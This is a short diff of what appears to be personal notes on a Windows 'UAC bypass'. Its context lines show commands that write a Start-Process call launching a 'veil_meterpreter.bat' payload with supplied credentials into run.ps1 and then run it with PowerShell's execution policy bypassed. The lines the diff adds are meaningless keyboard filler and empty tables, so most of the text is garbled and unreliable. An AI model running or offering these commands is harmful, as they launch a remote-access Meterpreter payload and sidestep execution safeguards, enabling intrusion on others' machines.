@@ -101,3 +101,28 @@ UAC bypass:
    •  echo Start-Process veil_meterpreter.bat  -Credential ($mycreds) >> run.ps1
 
    • powershell -ExecutionPolicy Bypass -File run.ps1 
+   
+   
+   
+   # dsdsd
+fdf- - - 
+- 
+- 
+- 
+
+------------
+
+ccc|   |   |
+| ------------ | ------------ |
+|   |   |
+|   |   |
+
+| cddfdfdf  |dfdfd   |
+| ------------ | ------------ |
+|   fdfdf|dfdfdf   |
+|  dfdf |  fdfdf |
+xcvxcvxcvx
+
+[========]
+
+vcxvxcv
